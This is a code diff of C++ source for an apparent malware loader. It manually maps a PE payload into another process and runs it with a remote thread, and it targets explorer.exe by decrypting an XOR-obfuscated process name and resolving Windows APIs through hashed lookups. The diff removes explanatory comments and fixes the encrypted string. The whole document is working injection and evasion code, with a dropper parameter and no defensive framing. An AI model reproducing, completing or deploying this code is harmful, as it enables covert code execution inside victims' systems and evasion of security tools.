@@ -33,11 +33,9 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
 
-    // 1. Allocate as READWRITE (not EXECUTE yet)
     PBYTE pTargetBase = (PBYTE)fVirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pTargetBase) return false;
 
-    // 2. Map locally and fix relocs
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
     PBYTE pLocalBase = localMapping.data();
     memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
@@ -69,14 +67,11 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    // 3. Write fixed image to target
     if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) return false;
 
-    // 4. Change protections to EXECUTE_READ
     DWORD oldProtect;
     if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) return false;
 
-    // 5. Execution (using CreateRemoteThread for now but with better protections)
     HANDLE hThread = fCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
     if (!hThread) return false;
 
@@ -131,8 +126,8 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    // "explorer.exe"
-    DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31"));
+    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
+    DWORD pid = GetProcessIdByName(utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F"));
     if (pid == 0) return false;
 
     auto fOpenProcess = utils::GetProcAddressH<decltype(&OpenProcess)>("kernel32.dll", H_OpenProcess);
